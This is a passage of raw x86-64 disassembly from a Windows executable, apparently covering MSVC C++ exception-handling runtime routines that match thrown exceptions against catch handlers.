   14000b915:	48 63 4f 0c          	movslq 0xc(%rdi),%rcx
   14000b919:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
   14000b91d:	48 63 4f 10          	movslq 0x10(%rdi),%rcx
   14000b921:	48 8d 14 91          	lea    (%rcx,%rdx,4),%rdx
   14000b925:	48 63 5c 10 f0       	movslq -0x10(%rax,%rdx,1),%rbx
   14000b92a:	e8 b1 ed ff ff       	call   0x14000a6e0
   14000b92f:	48 03 c3             	add    %rbx,%rax
   14000b932:	eb 02                	jmp    0x14000b936
   14000b934:	33 c0                	xor    %eax,%eax
   14000b936:	48 85 c0             	test   %rax,%rax
   14000b939:	74 48                	je     0x14000b983
   14000b93b:	e8 a0 ed ff ff       	call   0x14000a6e0
   14000b940:	48 63 4f 0c          	movslq 0xc(%rdi),%rcx
   14000b944:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
   14000b948:	48 63 4f 10          	movslq 0x10(%rdi),%rcx
   14000b94c:	48 8d 14 91          	lea    (%rcx,%rdx,4),%rdx
   14000b950:	83 7c 10 f0 00       	cmpl   $0x0,-0x10(%rax,%rdx,1)
   14000b955:	74 24                	je     0x14000b97b
   14000b957:	e8 84 ed ff ff       	call   0x14000a6e0
   14000b95c:	48 63 4f 0c          	movslq 0xc(%rdi),%rcx
   14000b960:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
   14000b964:	48 63 4f 10          	movslq 0x10(%rdi),%rcx
   14000b968:	48 8d 14 91          	lea    (%rcx,%rdx,4),%rdx
   14000b96c:	48 63 5c 10 f0       	movslq -0x10(%rax,%rdx,1),%rbx
   14000b971:	e8 6a ed ff ff       	call   0x14000a6e0
   14000b976:	48 03 c3             	add    %rbx,%rax
   14000b979:	eb 02                	jmp    0x14000b97d
   14000b97b:	33 c0                	xor    %eax,%eax
   14000b97d:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   14000b981:	75 7f                	jne    0x14000ba02
   14000b983:	e8 58 ed ff ff       	call   0x14000a6e0
   14000b988:	48 63 4f 0c          	movslq 0xc(%rdi),%rcx
   14000b98c:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
   14000b990:	48 63 4f 10          	movslq 0x10(%rdi),%rcx
   14000b994:	48 8d 14 91          	lea    (%rcx,%rdx,4),%rdx
   14000b998:	f6 44 10 ec 40       	testb  $0x40,-0x14(%rax,%rdx,1)
   14000b99d:	75 63                	jne    0x14000ba02
   14000b99f:	e8 3c ed ff ff       	call   0x14000a6e0
   14000b9a4:	8b 4f 0c             	mov    0xc(%rdi),%ecx
   14000b9a7:	4c 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%r8
   14000b9ae:	00 
   14000b9af:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   14000b9b4:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   14000b9b9:	ff c9                	dec    %ecx
   14000b9bb:	48 63 c9             	movslq %ecx,%rcx
   14000b9be:	4d 8b cd             	mov    %r13,%r9
   14000b9c1:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
   14000b9c5:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   14000b9c9:	48 63 47 10          	movslq 0x10(%rdi),%rax
   14000b9cd:	49 8b d6             	mov    %r14,%rdx
   14000b9d0:	48 03 c8             	add    %rax,%rcx
   14000b9d3:	48 8b 84 24 e8 00 00 	mov    0xe8(%rsp),%rax
   14000b9da:	00 
   14000b9db:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000b9e0:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   14000b9e5:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000b9ea:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000b9f0:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000b9f5:	48 8b ce             	mov    %rsi,%rcx
   14000b9f8:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000b9fd:	e8 2e fd ff ff       	call   0x14000b730
   14000ba02:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000ba09:	ff c0                	inc    %eax
   14000ba0b:	48 83 c7 14          	add    $0x14,%rdi
   14000ba0f:	89 84 24 b0 00 00 00 	mov    %eax,0xb0(%rsp)
   14000ba16:	3b 44 24 60          	cmp    0x60(%rsp),%eax
   14000ba1a:	0f 82 c1 fe ff ff    	jb     0x14000b8e1
   14000ba20:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   14000ba27:	00 
   14000ba28:	48 83 c4 70          	add    $0x70,%rsp
   14000ba2c:	41 5f                	pop    %r15
   14000ba2e:	41 5e                	pop    %r14
   14000ba30:	41 5d                	pop    %r13
   14000ba32:	41 5c                	pop    %r12
   14000ba34:	5f                   	pop    %rdi
   14000ba35:	5e                   	pop    %rsi
   14000ba36:	5d                   	pop    %rbp
   14000ba37:	c3                   	ret
   14000ba38:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000ba3d:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000ba42:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000ba47:	55                   	push   %rbp
   14000ba48:	56                   	push   %rsi
   14000ba49:	57                   	push   %rdi
   14000ba4a:	41 54                	push   %r12
   14000ba4c:	41 55                	push   %r13
   14000ba4e:	41 56                	push   %r14
   14000ba50:	41 57                	push   %r15
   14000ba52:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   14000ba59:	48 8b 9c 24 00 01 00 	mov    0x100(%rsp),%rbx
   14000ba60:	00 
   14000ba61:	45 33 ff             	xor    %r15d,%r15d
   14000ba64:	4c 8b e2             	mov    %rdx,%r12
   14000ba67:	48 8b f9             	mov    %rcx,%rdi
   14000ba6a:	49 8b d1             	mov    %r9,%rdx
   14000ba6d:	48 8b cb             	mov    %rbx,%rcx
   14000ba70:	4d 8b e9             	mov    %r9,%r13
   14000ba73:	49 8b e8             	mov    %r8,%rbp
   14000ba76:	44 88 7c 24 60       	mov    %r15b,0x60(%rsp)
   14000ba7b:	45 8a f7             	mov    %r15b,%r14b
   14000ba7e:	44 88 bc 24 e0 00 00 	mov    %r15b,0xe0(%rsp)
   14000ba85:	00 
   14000ba86:	e8 5d f2 ff ff       	call   0x14000ace8
   14000ba8b:	4c 8d 4c 24 78       	lea    0x78(%rsp),%r9
   14000ba90:	4c 8b c3             	mov    %rbx,%r8
   14000ba93:	49 8b d5             	mov    %r13,%rdx
   14000ba96:	49 8b cc             	mov    %r12,%rcx
   14000ba99:	8b f0                	mov    %eax,%esi
   14000ba9b:	e8 54 eb ff ff       	call   0x14000a5f4
   14000baa0:	4c 8b c3             	mov    %rbx,%r8
   14000baa3:	49 8b d5             	mov    %r13,%rdx
   14000baa6:	49 8b cc             	mov    %r12,%rcx
   14000baa9:	e8 b2 f2 ff ff       	call   0x14000ad60
   14000baae:	4c 8b c3             	mov    %rbx,%r8
   14000bab1:	49 8b d5             	mov    %r13,%rdx
   14000bab4:	3b f0                	cmp    %eax,%esi
   14000bab6:	7e 20                	jle    0x14000bad8
   14000bab8:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   14000babd:	44 8b ce             	mov    %esi,%r9d
   14000bac0:	e8 53 f2 ff ff       	call   0x14000ad18
   14000bac5:	44 8b ce             	mov    %esi,%r9d
   14000bac8:	4c 8b c3             	mov    %rbx,%r8
   14000bacb:	49 8b d5             	mov    %r13,%rdx
   14000bace:	49 8b cc             	mov    %r12,%rcx
   14000bad1:	e8 4e f2 ff ff       	call   0x14000ad24
   14000bad6:	eb 0a                	jmp    0x14000bae2
   14000bad8:	49 8b cc             	mov    %r12,%rcx
   14000badb:	e8 80 f2 ff ff       	call   0x14000ad60
   14000bae0:	8b f0                	mov    %eax,%esi
   14000bae2:	83 fe ff             	cmp    $0xffffffff,%esi
   14000bae5:	7c 05                	jl     0x14000baec
   14000bae7:	3b 73 04             	cmp    0x4(%rbx),%esi
   14000baea:	7c 05                	jl     0x14000baf1
   14000baec:	e8 fb 84 ff ff       	call   0x140003fec
   14000baf1:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   14000baf7:	0f 85 4b 04 00 00    	jne    0x14000bf48
   14000bafd:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   14000bb01:	0f 85 b0 01 00 00    	jne    0x14000bcb7
   14000bb07:	81 7f 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rdi)
   14000bb0e:	74 16                	je     0x14000bb26
   14000bb10:	81 7f 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rdi)
   14000bb17:	74 0d                	je     0x14000bb26
   14000bb19:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   14000bb20:	0f 85 91 01 00 00    	jne    0x14000bcb7
   14000bb26:	4c 39 7f 30          	cmp    %r15,0x30(%rdi)
   14000bb2a:	0f 85 87 01 00 00    	jne    0x14000bcb7
   14000bb30:	e8 db 7a ff ff       	call   0x140003610
   14000bb35:	4c 39 b8 f0 00 00 00 	cmp    %r15,0xf0(%rax)
   14000bb3c:	0f 84 eb 03 00 00    	je     0x14000bf2d
   14000bb42:	e8 c9 7a ff ff       	call   0x140003610
   14000bb47:	48 8b b8 f0 00 00 00 	mov    0xf0(%rax),%rdi
   14000bb4e:	e8 bd 7a ff ff       	call   0x140003610
   14000bb53:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   14000bb57:	48 8b a8 f8 00 00 00 	mov    0xf8(%rax),%rbp
   14000bb5e:	c6 44 24 60 01       	movb   $0x1,0x60(%rsp)
   14000bb63:	48 89 ac 24 f0 00 00 	mov    %rbp,0xf0(%rsp)
   14000bb6a:	00 
   14000bb6b:	e8 bc eb ff ff       	call   0x14000a72c
   14000bb70:	ba 01 00 00 00       	mov    $0x1,%edx
   14000bb75:	48 8b cf             	mov    %rdi,%rcx
   14000bb78:	e8 6b 06 00 00       	call   0x14000c1e8
   14000bb7d:	41 3b c7             	cmp    %r15d,%eax
   14000bb80:	75 05                	jne    0x14000bb87
   14000bb82:	e8 65 84 ff ff       	call   0x140003fec
   14000bb87:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   14000bb8d:	75 2c                	jne    0x14000bbbb
   14000bb8f:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   14000bb93:	75 26                	jne    0x14000bbbb
   14000bb95:	81 7f 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rdi)
   14000bb9c:	74 12                	je     0x14000bbb0
   14000bb9e:	81 7f 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rdi)
   14000bba5:	74 09                	je     0x14000bbb0
   14000bba7:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   14000bbae:	75 0b                	jne    0x14000bbbb
   14000bbb0:	4c 39 7f 30          	cmp    %r15,0x30(%rdi)
   14000bbb4:	75 05                	jne    0x14000bbbb
   14000bbb6:	e8 31 84 ff ff       	call   0x140003fec
   14000bbbb:	e8 50 7a ff ff       	call   0x140003610
   14000bbc0:	4c 39 b8 08 01 00 00 	cmp    %r15,0x108(%rax)
   14000bbc7:	0f 84 ea 00 00 00    	je     0x14000bcb7
   14000bbcd:	e8 3e 7a ff ff       	call   0x140003610
   14000bbd2:	48 8b a8 08 01 00 00 	mov    0x108(%rax),%rbp
   14000bbd9:	e8 32 7a ff ff       	call   0x140003610
   14000bbde:	48 8b d5             	mov    %rbp,%rdx
   14000bbe1:	48 8b cf             	mov    %rdi,%rcx
   14000bbe4:	4c 89 b8 08 01 00 00 	mov    %r15,0x108(%rax)
   14000bbeb:	e8 54 f5 ff ff       	call   0x14000b144
   14000bbf0:	41 3a c7             	cmp    %r15b,%al
   14000bbf3:	0f 85 b6 00 00 00    	jne    0x14000bcaf
   14000bbf9:	44 39 7d 00          	cmp    %r15d,0x0(%rbp)
   14000bbfd:	45 8b e7             	mov    %r15d,%r12d
   14000bc00:	7e 55                	jle    0x14000bc57
   14000bc02:	49 8b f7             	mov    %r15,%rsi
   14000bc05:	e8 d6 ea ff ff       	call   0x14000a6e0
   14000bc0a:	48 63 4d 04          	movslq 0x4(%rbp),%rcx
   14000bc0e:	48 03 c6             	add    %rsi,%rax
   14000bc11:	44 39 7c 01 04       	cmp    %r15d,0x4(%rcx,%rax,1)
   14000bc16:	74 1b                	je     0x14000bc33
   14000bc18:	e8 c3 ea ff ff       	call   0x14000a6e0
   14000bc1d:	48 63 4d 04          	movslq 0x4(%rbp),%rcx
   14000bc21:	48 03 c6             	add    %rsi,%rax
   14000bc24:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   14000bc29:	e8 b2 ea ff ff       	call   0x14000a6e0
   14000bc2e:	48 03 c3             	add    %rbx,%rax
   14000bc31:	eb 03                	jmp    0x14000bc36
   14000bc33:	49 8b c7             	mov    %r15,%rax
   14000bc36:	48 8d 15 bb 88 00 00 	lea    0x88bb(%rip),%rdx        # 0x1400144f8
   14000bc3d:	48 8b c8             	mov    %rax,%rcx
   14000bc40:	e8 eb 60 ff ff       	call   0x140001d30
   14000bc45:	41 3a c7             	cmp    %r15b,%al
   14000bc48:	75 13                	jne    0x14000bc5d
   14000bc4a:	41 ff c4             	inc    %r12d
   14000bc4d:	48 83 c6 14          	add    $0x14,%rsi
   14000bc51:	44 3b 65 00          	cmp    0x0(%rbp),%r12d
   14000bc55:	7c ae                	jl     0x14000bc05
   14000bc57:	e8 6c 83 ff ff       	call   0x140003fc8
   14000bc5c:	cc                   	int3
   14000bc5d:	b2 01                	mov    $0x1,%dl
   14000bc5f:	48 8b cf             	mov    %rdi,%rcx
   14000bc62:	e8 75 f4 ff ff       	call   0x14000b0dc
   14000bc67:	4c 8d 1d ba 44 00 00 	lea    0x44ba(%rip),%r11        # 0x140010128
   14000bc6e:	48 8d 94 24 e0 00 00 	lea    0xe0(%rsp),%rdx
   14000bc75:	00 
   14000bc76:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000bc7d:	00 
   14000bc7e:	4c 89 9c 24 e0 00 00 	mov    %r11,0xe0(%rsp)
   14000bc85:	00 
   14000bc86:	e8 ed 5d ff ff       	call   0x140001a78
   14000bc8b:	4c 8d 1d 86 44 00 00 	lea    0x4486(%rip),%r11        # 0x140010118
   14000bc92:	48 8d 15 87 5a 00 00 	lea    0x5a87(%rip),%rdx        # 0x140011720
   14000bc99:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000bca0:	00 
   14000bca1:	4c 89 9c 24 88 00 00 	mov    %r11,0x88(%rsp)
   14000bca8:	00 
   14000bca9:	e8 52 77 ff ff       	call   0x140003400
   14000bcae:	cc                   	int3
   14000bcaf:	48 8b ac 24 f0 00 00 	mov    0xf0(%rsp),%rbp
   14000bcb6:	00 
   14000bcb7:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   14000bcbd:	0f 85 85 02 00 00    	jne    0x14000bf48
   14000bcc3:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   14000bcc7:	0f 85 7b 02 00 00    	jne    0x14000bf48
   14000bccd:	81 7f 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rdi)
   14000bcd4:	74 16                	je     0x14000bcec
   14000bcd6:	81 7f 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rdi)
   14000bcdd:	74 0d                	je     0x14000bcec
   14000bcdf:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   14000bce6:	0f 85 5c 02 00 00    	jne    0x14000bf48
   14000bcec:	44 39 7b 0c          	cmp    %r15d,0xc(%rbx)
   14000bcf0:	0f 86 84 01 00 00    	jbe    0x14000be7a
   14000bcf6:	44 8b 84 24 10 01 00 	mov    0x110(%rsp),%r8d
   14000bcfd:	00 
   14000bcfe:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   14000bd03:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000bd08:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000bd0d:	48 8d 44 24 64       	lea    0x64(%rsp),%rax
   14000bd12:	44 8b ce             	mov    %esi,%r9d
   14000bd15:	48 8b d3             	mov    %rbx,%rdx
   14000bd18:	49 8b cc             	mov    %r12,%rcx
   14000bd1b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000bd20:	e8 4f ec ff ff       	call   0x14000a974
   14000bd25:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   14000bd29:	48 8b e8             	mov    %rax,%rbp
   14000bd2c:	8b 44 24 68          	mov    0x68(%rsp),%eax
   14000bd30:	3b c8                	cmp    %eax,%ecx
   14000bd32:	0f 83 42 01 00 00    	jae    0x14000be7a
   14000bd38:	39 75 00             	cmp    %esi,0x0(%rbp)
   14000bd3b:	0f 8f 1e 01 00 00    	jg     0x14000be5f
   14000bd41:	3b 75 04             	cmp    0x4(%rbp),%esi
   14000bd44:	0f 8f 15 01 00 00    	jg     0x14000be5f
   14000bd4a:	e8 91 e9 ff ff       	call   0x14000a6e0
   14000bd4f:	4c 63 65 10          	movslq 0x10(%rbp),%r12
   14000bd53:	44 8b 75 0c          	mov    0xc(%rbp),%r14d
   14000bd57:	4c 03 e0             	add    %rax,%r12
   14000bd5a:	45 3b f7             	cmp    %r15d,%r14d
   14000bd5d:	0f 8e e4 00 00 00    	jle    0x14000be47
   14000bd63:	e8 90 e9 ff ff       	call   0x14000a6f8
   14000bd68:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   14000bd6c:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   14000bd70:	48 8d 44 10 04       	lea    0x4(%rax,%rdx,1),%rax
   14000bd75:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000bd7a:	e8 79 e9 ff ff       	call   0x14000a6f8
   14000bd7f:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   14000bd83:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   14000bd87:	44 8b 3c 10          	mov    (%rax,%rdx,1),%r15d
   14000bd8b:	eb 34                	jmp    0x14000bdc1
   14000bd8d:	e8 66 e9 ff ff       	call   0x14000a6f8
   14000bd92:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000bd97:	4c 8b 47 30          	mov    0x30(%rdi),%r8
   14000bd9b:	48 63 09             	movslq (%rcx),%rcx
   14000bd9e:	48 03 c1             	add    %rcx,%rax
   14000bda1:	49 8b cc             	mov    %r12,%rcx
   14000bda4:	48 8b d0             	mov    %rax,%rdx
   14000bda7:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   14000bdae:	00 
   14000bdaf:	e8 24 f0 ff ff       	call   0x14000add8
   14000bdb4:	85 c0                	test   %eax,%eax
   14000bdb6:	75 1a                	jne    0x14000bdd2
   14000bdb8:	41 ff cf             	dec    %r15d
   14000bdbb:	48 83 44 24 70 04    	addq   $0x4,0x70(%rsp)
   14000bdc1:	45 85 ff             	test   %r15d,%r15d
   14000bdc4:	7f c7                	jg     0x14000bd8d
   14000bdc6:	41 ff ce             	dec    %r14d
   14000bdc9:	49 83 c4 14          	add    $0x14,%r12
   14000bdcd:	45 33 ff             	xor    %r15d,%r15d
   14000bdd0:	eb 88                	jmp    0x14000bd5a
   14000bdd2:	8a 84 24 08 01 00 00 	mov    0x108(%rsp),%al
   14000bdd9:	4c 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%r8
   14000bde0:	00 
   14000bde1:	41 b6 01             	mov    $0x1,%r14b
   14000bde4:	88 44 24 58          	mov    %al,0x58(%rsp)
   14000bde8:	8a 44 24 60          	mov    0x60(%rsp),%al
   14000bdec:	4d 8b cd             	mov    %r13,%r9
   14000bdef:	88 44 24 50          	mov    %al,0x50(%rsp)
   14000bdf3:	48 8b 84 24 18 01 00 	mov    0x118(%rsp),%rax
   14000bdfa:	00 
   14000bdfb:	48 8b cf             	mov    %rdi,%rcx
   14000bdfe:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000be03:	8b 84 24 10 01 00 00 	mov    0x110(%rsp),%eax
   14000be0a:	44 88 b4 24 e0 00 00 	mov    %r14b,0xe0(%rsp)
   14000be11:	00 
   14000be12:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000be16:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000be1d:	00 
   14000be1e:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   14000be23:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000be28:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   14000be2d:	4c 8b a4 24 e8 00 00 	mov    0xe8(%rsp),%r12
   14000be34:	00 
   14000be35:	49 8b d4             	mov    %r12,%rdx
   14000be38:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000be3d:	e8 ee f8 ff ff       	call   0x14000b730
   14000be42:	45 33 ff             	xor    %r15d,%r15d
   14000be45:	eb 10                	jmp    0x14000be57
   14000be47:	44 8a b4 24 e0 00 00 	mov    0xe0(%rsp),%r14b
   14000be4e:	00 
   14000be4f:	4c 8b a4 24 e8 00 00 	mov    0xe8(%rsp),%r12
   14000be56:	00 
   14000be57:	8b 44 24 68          	mov    0x68(%rsp),%eax
   14000be5b:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   14000be5f:	ff c1                	inc    %ecx
   14000be61:	48 83 c5 14          	add    $0x14,%rbp
   14000be65:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   14000be69:	3b c8                	cmp    %eax,%ecx
   14000be6b:	0f 82 c7 fe ff ff    	jb     0x14000bd38
   14000be71:	45 3a f7             	cmp    %r15b,%r14b
   14000be74:	0f 85 a0 00 00 00    	jne    0x14000bf1a
   14000be7a:	8b 03                	mov    (%rbx),%eax
   14000be7c:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   14000be81:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   14000be86:	0f 82 8e 00 00 00    	jb     0x14000bf1a
   14000be8c:	8b 73 20             	mov    0x20(%rbx),%esi
   14000be8f:	41 3b f7             	cmp    %r15d,%esi
   14000be92:	74 0d                	je     0x14000bea1
   14000be94:	48 63 f6             	movslq %esi,%rsi
   14000be97:	e8 44 e8 ff ff       	call   0x14000a6e0
   14000be9c:	48 03 c6             	add    %rsi,%rax
   14000be9f:	eb 03                	jmp    0x14000bea4
   14000bea1:	49 8b c7             	mov    %r15,%rax
   14000bea4:	49 3b c7             	cmp    %r15,%rax
   14000bea7:	74 71                	je     0x14000bf1a
   14000bea9:	41 3b f7             	cmp    %r15d,%esi
   14000beac:	74 11                	je     0x14000bebf
   14000beae:	e8 2d e8 ff ff       	call   0x14000a6e0
   14000beb3:	48 8b d0             	mov    %rax,%rdx
   14000beb6:	48 63 43 20          	movslq 0x20(%rbx),%rax
   14000beba:	48 03 d0             	add    %rax,%rdx
   14000bebd:	eb 03                	jmp    0x14000bec2
   14000bebf:	49 8b d7             	mov    %r15,%rdx
   14000bec2:	48 8b cf             	mov    %rdi,%rcx
   14000bec5:	e8 7a f2 ff ff       	call   0x14000b144
   14000beca:	41 3a c7             	cmp    %r15b,%al
   14000becd:	75 4b                	jne    0x14000bf1a
   14000becf:	4c 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%r9
   14000bed6:	00 
   14000bed7:	4c 8b c3             	mov    %rbx,%r8
   14000beda:	49 8b d5             	mov    %r13,%rdx
   14000bedd:	49 8b cc             	mov    %r12,%rcx
   14000bee0:	e8 0f e7 ff ff       	call   0x14000a5f4
   14000bee5:	8a 8c 24 08 01 00 00 	mov    0x108(%rsp),%cl
   14000beec:	4c 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%r8
   14000bef3:	00 
   14000bef4:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   14000bef8:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   14000befd:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000bf02:	83 4c 24 28 ff       	orl    $0xffffffff,0x28(%rsp)
   14000bf07:	4c 8b c8             	mov    %rax,%r9
   14000bf0a:	48 8b d7             	mov    %rdi,%rdx
   14000bf0d:	49 8b cc             	mov    %r12,%rcx
   14000bf10:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000bf15:	e8 5a ec ff ff       	call   0x14000ab74
   14000bf1a:	e8 f1 76 ff ff       	call   0x140003610
   14000bf1f:	4c 39 b8 08 01 00 00 	cmp    %r15,0x108(%rax)
   14000bf26:	74 05                	je     0x14000bf2d
   14000bf28:	e8 bf 80 ff ff       	call   0x140003fec
   14000bf2d:	48 8b 9c 24 f8 00 00 	mov    0xf8(%rsp),%rbx
   14000bf34:	00 
   14000bf35:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   14000bf3c:	41 5f                	pop    %r15
   14000bf3e:	41 5e                	pop    %r14
   14000bf40:	41 5d                	pop    %r13
   14000bf42:	41 5c                	pop    %r12
   14000bf44:	5f                   	pop    %rdi
   14000bf45:	5e                   	pop    %rsi
   14000bf46:	5d                   	pop    %rbp
   14000bf47:	c3                   	ret
   14000bf48:	44 39 7b 0c          	cmp    %r15d,0xc(%rbx)
   14000bf4c:	76 cc                	jbe    0x14000bf1a
   14000bf4e:	44 38 bc 24 08 01 00 	cmp    %r15b,0x108(%rsp)
   14000bf55:	00 
   14000bf56:	75 34                	jne    0x14000bf8c
   14000bf58:	48 8b 84 24 18 01 00 	mov    0x118(%rsp),%rax
   14000bf5f:	00 
   14000bf60:	4d 8b cd             	mov    %r13,%r9
   14000bf63:	4c 8b c5             	mov    %rbp,%r8
   14000bf66:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000bf6b:	8b 84 24 10 01 00 00 	mov    0x110(%rsp),%eax
   14000bf72:	49 8b d4             	mov    %r12,%rdx
   14000bf75:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000bf79:	48 8b cf             	mov    %rdi,%rcx
   14000bf7c:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000bf80:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bf85:	e8 6a f8 ff ff       	call   0x14000b7f4
   14000bf8a:	eb 8e                	jmp    0x14000bf1a
   14000bf8c:	e8 37 80 ff ff       	call   0x140003fc8
   14000bf91:	cc                   	int3
   14000bf92:	cc                   	int3
   14000bf93:	cc                   	int3
   14000bf94:	40 53                	rex push %rbx
   14000bf96:	48 83 ec 20          	sub    $0x20,%rsp
   14000bf9a:	48 8b d9             	mov    %rcx,%rbx
   14000bf9d:	e8 66 5b ff ff       	call   0x140001b08
   14000bfa2:	4c 8d 1d 6f 41 00 00 	lea    0x416f(%rip),%r11        # 0x140010118
   14000bfa9:	4c 89 1b             	mov    %r11,(%rbx)
   14000bfac:	48 8b c3             	mov    %rbx,%rax
   14000bfaf:	48 83 c4 20          	add    $0x20,%rsp
   14000bfb3:	5b                   	pop    %rbx
   14000bfb4:	c3                   	ret
   14000bfb5:	cc                   	int3
   14000bfb6:	cc                   	int3
   14000bfb7:	cc                   	int3
   14000bfb8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bfbd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000bfc2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000bfc7:	57                   	push   %rdi
   14000bfc8:	41 54                	push   %r12
   14000bfca:	41 56                	push   %r14
   14000bfcc:	48 83 ec 40          	sub    $0x40,%rsp
   14000bfd0:	49 8b e9             	mov    %r9,%rbp
   14000bfd3:	4d 8b e0             	mov    %r8,%r12
   14000bfd6:	48 8b f2             	mov    %rdx,%rsi
   14000bfd9:	48 8b d9             	mov    %rcx,%rbx
   14000bfdc:	e8 2f 76 ff ff       	call   0x140003610
   14000bfe1:	48 8b bc 24 80 00 00 	mov    0x80(%rsp),%rdi
   14000bfe8:	00 
   14000bfe9:	83 b8 c0 02 00 00 00 	cmpl   $0x0,0x2c0(%rax)
   14000bff0:	ba ff ff ff 1f       	mov    $0x1fffffff,%edx
   14000bff5:	41 b8 29 00 00 80    	mov    $0x80000029,%r8d
   14000bffb:	41 b9 26 00 00 80    	mov    $0x80000026,%r9d
   14000c001:	41 be 01 00 00 00    	mov    $0x1,%r14d
   14000c007:	75 38                	jne    0x14000c041
   14000c009:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000c00f:	74 30                	je     0x14000c041
   14000c011:	44 39 03             	cmp    %r8d,(%rbx)
   14000c014:	75 10                	jne    0x14000c026
   14000c016:	83 7b 18 0f          	cmpl   $0xf,0x18(%rbx)
   14000c01a:	75 0a                	jne    0x14000c026
   14000c01c:	48 81 7b 60 20 05 93 	cmpq   $0x19930520,0x60(%rbx)
   14000c023:	19 
   14000c024:	74 1b                	je     0x14000c041
   14000c026:	44 39 0b             	cmp    %r9d,(%rbx)
   14000c029:	74 16                	je     0x14000c041
   14000c02b:	8b 0f                	mov    (%rdi),%ecx
   14000c02d:	23 ca                	and    %edx,%ecx
   14000c02f:	81 f9 22 05 93 19    	cmp    $0x19930522,%ecx
   14000c035:	72 0a                	jb     0x14000c041
   14000c037:	44 84 77 24          	test   %r14b,0x24(%rdi)
   14000c03b:	0f 85 80 01 00 00    	jne    0x14000c1c1
   14000c041:	8b 43 04             	mov    0x4(%rbx),%eax
   14000c044:	a8 66                	test   $0x66,%al
   14000c046:	0f 84 93 00 00 00    	je     0x14000c0df
   14000c04c:	83 7f 04 00          	cmpl   $0x0,0x4(%rdi)
   14000c050:	0f 84 6b 01 00 00    	je     0x14000c1c1
   14000c056:	83 bc 24 88 00 00 00 	cmpl   $0x0,0x88(%rsp)
